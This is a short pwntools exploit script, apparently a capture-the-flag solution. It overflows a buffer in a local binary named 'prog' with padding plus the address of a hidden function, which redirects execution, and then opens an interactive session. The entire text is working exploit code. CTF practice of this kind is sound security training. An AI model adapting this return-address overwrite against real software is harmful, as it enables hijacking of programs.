from pwn import *

e = ELF('prog')
addr = e.sym.it_is_never_used__or_is_it
context.clear(arch=e.arch, endian=e.endian)

p = e.process()

payload = 'A'*(1+context.bytes)
payload += pack(addr)

p.sendline(payload)
p.interactive()
